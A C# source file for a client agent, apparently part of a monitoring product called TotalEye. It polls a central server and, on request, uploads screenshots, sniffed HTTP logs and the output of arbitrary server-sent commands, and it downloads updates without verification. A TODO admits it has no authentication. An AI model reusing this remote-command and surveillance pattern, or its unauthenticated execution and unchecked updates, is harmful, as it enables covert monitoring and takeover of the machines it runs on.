using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using VowAI.TotalEye.ClientShared;
using VowAI.TotalEye.Models;
using VowAI.TotalEye.Tools;

namespace VowAI.TotalEye.Client
{
    public class CentrePoller : IDisposable
    {
        private readonly ICentrePollerConfiguration _configuration;
        private readonly IUpdateConfiguration _updateConfiguration;
        private readonly IClientControlPolicyProvider _policyProvider;
        private readonly IHttpClientFactory _clientFactory;
        private readonly IConfiguredComputerSniffer _computerSniffer;
        private readonly IConfiguredHttpSniffer _httpSniffer;

        public CentrePoller(ICentrePollerConfiguration configuration, IUpdateConfiguration updateConfiguration, IClientControlPolicyProvider policyProvider, IHttpClientFactory clientFactory, IConfiguredComputerSniffer computerSniffer, IConfiguredHttpSniffer httpSniffer)
        {
            _configuration = configuration;
            _updateConfiguration = updateConfiguration;
            _policyProvider = policyProvider;
            _clientFactory = clientFactory;
            _computerSniffer = computerSniffer;
            _httpSniffer = httpSniffer;

            Task.Run(() => PollCentre(null));
        }

        private async void PollCentre(object? state)
        {
            while (true)
            {
                try
                {
                    HttpClient client = _clientFactory.CreateClient();

                    //TODO Need authentication.

                    TryDownloadUpdate(client);
                    Poll(client);
                }
                catch (Exception exception)
                {
                    exception.WriteString<CentrePoller>();
                }

                try
                {
                    await Task.Delay(TimeSpan.FromSeconds(90));
                }
                catch (Exception exception)
                {
                    exception.WriteString<CentrePoller>();
                }
            }
        }

        private async void Poll(HttpClient client)
        {
            CentreInfoRequest? request;
            ClientControlPolicy? policy;

            if ((request = await Ask(client)) == null)
            {
                throw new InvalidDataException("Fail obtaining request information from centre.");
            }
            else if((policy = await Reply(client, request)) ==null)
            {
                throw new InvalidDataException("Fail obtaining client control policy from centre.");
            }
            else
            {
                ApplyPolicy(policy);
            }
        }

        private async Task<CentreInfoRequest?> Ask(HttpClient client)
        {
            HttpResponseMessage response = await client.GetAsync(_configuration.AskUrl);

            if (response.IsSuccessStatusCode == false)
            {
                throw new InvalidOperationException($"Fail to read from centre: HTTP {response.StatusCode}.");
            }

            return await response.Content.ReadFromJsonAsync<CentreInfoRequest>();
        }

        private async Task<ClientControlPolicy?> Reply(HttpClient client, CentreInfoRequest request)
        {
            switch (request.Name.ToLower())
            {
                case "screenshot":

                    return await UploadImageFromPath(client, request);

                case "http_sniffer":

                    return await UploadHttpLogs(client, request);

                case "command":

                    return await UploadCommandOutput(client, request);

                default:

                    throw new ArgumentException($"Unknown request from centre '{request.Name}'.");
            }
        }

        private async Task<ClientControlPolicy?> UploadImageFromPath(HttpClient client, CentreInfoRequest request)
        {
            string location = LocalComputer.RunCommand("VowAI.TotalEye.CatchScreen.exe /Destination:Screenshot.jpg");

            MultipartFormDataContent content = new MultipartFormDataContent();
            StringContent tokenContent = new StringContent(request.Token);
            ByteArrayContent imageContent = new ByteArrayContent(File.ReadAllBytes(location));

            content.Add(tokenContent, "Token");
            content.Add(imageContent, "Payload", new FileInfo(location).Name);

            HttpResponseMessage response = await client.PostAsync(request.ReplyUrl, content);
            return await response.Content.ReadFromJsonAsync<ClientControlPolicy>();
        }

        private async Task<ClientControlPolicy?> UploadHttpLogs(HttpClient client, CentreInfoRequest request)
        {
            MultipartFormDataContent content = new MultipartFormDataContent();
            StringContent tokenContent = new StringContent(request.Token, Encoding.UTF8);
            StringContent logContent = new StringContent(_httpSniffer.ReadActivityLogs(), Encoding.UTF8, "text/plain; charset=UTF-8");

            content.Add(tokenContent, "Token");
            content.Add(logContent, "Payload");

            HttpResponseMessage response = await client.PostAsync(request.ReplyUrl, content);
            return await response.Content.ReadFromJsonAsync<ClientControlPolicy>();
        }

        private async Task<ClientControlPolicy?> UploadCommandOutput(HttpClient client, CentreInfoRequest request)
        {
            MultipartFormDataContent content = new MultipartFormDataContent();
            StringContent token = new StringContent(request.Token, Encoding.UTF8);
            StringContent outputContent = new StringContent(LocalComputer.RunCommand(request.Description), Encoding.UTF8, "text/plain; charset=UTF-8");

            content.Add(token, "Token");
            content.Add(outputContent, "Payload");

            HttpResponseMessage response = await client.PostAsync(request.ReplyUrl, content);
            return await response.Content.ReadFromJsonAsync<ClientControlPolicy>();
        }

        private void ApplyPolicy(ClientControlPolicy policy)
        {
            switch (policy.Tag.ToLower())
            {
                case "http_connect":
                case "http_request":
                case "http_response":
                case "local_computer":

                    (_policyProvider as ClientControlPolicyProvider)?.SetPolicy(policy);
                    break;

                default:

                    throw new ArgumentException($"Unknown policy tag '{policy.Tag}'.");
            }
        }

        private async void TryDownloadUpdate(HttpClient client)
        {
            HttpResponseMessage response = await client.GetAsync(_updateConfiguration.VersionUrl);

            if (response.IsSuccessStatusCode == false)
            {
                throw new InvalidOperationException($"Fail to read update information: HTTP {response.StatusCode}.");
            }

            string text = await response.Content.ReadAsStringAsync();
            UpdateConfiguration newConfiguration = new UpdateConfiguration().Deserialize(text);

            if (newConfiguration.Version > _updateConfiguration.Version)
            {
                DownloadUpdate(client, newConfiguration.FileUrl);
                File.WriteAllText(newConfiguration.GetLocalPath(), text);
            }
        }

        private async void DownloadUpdate(HttpClient client, string fileUrl)
        {
            HttpResponseMessage response = await client.GetAsync(fileUrl);

            if (response.IsSuccessStatusCode == false)
            {
                throw new InvalidOperationException($"Fail to get update package: HTTP {response.StatusCode}.");
            }

            Stream downloadStream = await response.Content.ReadAsStreamAsync();

            string downloadDirectory = new UpdateConfiguration().GetDownloadDirectory();
            string downloadFile = $"{(DateTime.Now - DateTime.MinValue).TotalSeconds}.zip";
            string downloadPath = Path.Combine(downloadDirectory, downloadFile);

            using (FileStream file = new FileStream(downloadPath, FileMode.OpenOrCreate, FileAccess.Write))
            {
                downloadStream.CopyTo(file);
            }
        }

        public void Dispose()
        {
            _httpSniffer.Dispose();
            _computerSniffer.Dispose();
        }
    }
}
